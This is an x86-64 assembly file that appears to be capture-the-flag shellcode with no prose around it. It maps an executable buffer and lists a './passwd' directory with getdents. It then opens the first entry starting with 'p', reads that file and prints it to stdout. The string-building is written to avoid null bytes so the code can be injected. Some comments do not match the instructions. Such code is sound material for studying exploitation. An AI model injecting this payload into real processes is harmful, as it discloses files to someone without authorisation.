		.global _start

		.text
_start:
	#mmap(rdi(0), rsi(0xFFFF), rdx(PROT == 7), r10(flag == 34)
	xor %rdi, %rdi		#rdi = 0
	mov %rdi, %rsi		# rsi = 0x0000
	mov $0xFFFF, %si	# rsi = 0xFFFF
	mov $0x7, %dl		# rdx = 7
	xor %r10, %r10
	mov $34, %r10b		#r10 = 34
	// xor %r8, %r8
	mov $-1, %r8b		# r8 = 3
	xor %r9, %r9
	xor %rax, %rax
	mov $9, %al
	syscall

	mov %rax, %rdi # buffer
	movl $0x73736170, (%rax)
	inc %rax
	inc %rax
	inc %rax
	inc %rax
	movl $0x2e2f6477, (%rax)
	xor %rax, %rax

	# open
	xor %rsi, %rsi
	inc %rsi
	shl $16, %rsi
	xor %rax, %rax
	inc %rax
	inc %rax
	xor %rdx, %rdx
	syscall
	# ret =fd

_get:
	# getdents(fd, dirent, rdx)
	mov %rdi, %rsi # buffer
	mov %rax, %rdi #fd
	xor %rax, %rax
	xor %rdx, %rdx
	mov $0x3210, %dx
	xor %rax, %rax
	mov $78, %al
	syscall

	xor %rax, %rax
	# search substring
_loop:
	inc %rsi
	mov 1(%rsi), %al
	cmp $0x70, %al
	jne _loop

	dec %rsi
	dec %rsi
	movb $0x2f, 1(%rsi)
	dec %rsi
	movb $0x64, 1(%rsi)
	dec %rsi
	movb $0x77, 1(%rsi)
	dec %rsi
	movb $0x73, 1(%rsi)
	dec %rsi
	movb $0x73, 1(%rsi)
	dec %rsi
	movb $0x61, 1(%rsi)
	dec %rsi
	movb $0x70, 1(%rsi)
	dec %rsi
	movb $0x2f, 1(%rsi)
	dec %rsi
	movb $0x2e, 1(%rsi)
	inc %rsi

	mov %rsi, %rdi
	xor %rcx, %rcx
	# for (%rcx = 0; *%rsi != 0; ++%rcx) ;
_loop2:
	inc %rsi
	inc %rcx
	mov 1(%rsi), %al
	test %al, %al
	jnz _loop2
	inc %rcx

	mov %rdi, %rsi
	// # write file flag name
	// # write(1, flag, len)
	// mov %rcx, %rdx
	// xor %rdi, %rdi
	// inc %rdi
	// xor %rax, %rax
	// inc %rax
	// syscall

	# final open!!!
	# sys_2 open(filename, flag, rdx)
	mov %rsi, %rdi
	// movb $43, (%rdi)
	// inc %rdi
	xor %rsi, %rsi
	xor %rax, %rax
	inc %rax
	inc %rax
	syscall

	mov %rdi, %rsi
	# last read???
	# 0: sys_read(fd, buffer, counter)		rdi, rsi, rdx
	mov %rax, %rdi
	xor %rdx, %rdx
	inc %rdx
	shl $12, %rdx
	xor %rax, %rax
	syscall

	mov %rax, %rdx
	#last write
	# write(fd, buffer, count)
	xor %rdi, %rdi
	inc %rdi
	xor %rax, %rax
	inc %rax
	syscall

	# syscall 60, exit(0)
	xor %rax, %rax
	mov $60, %al
	xor %rdi, %rdi
	syscall
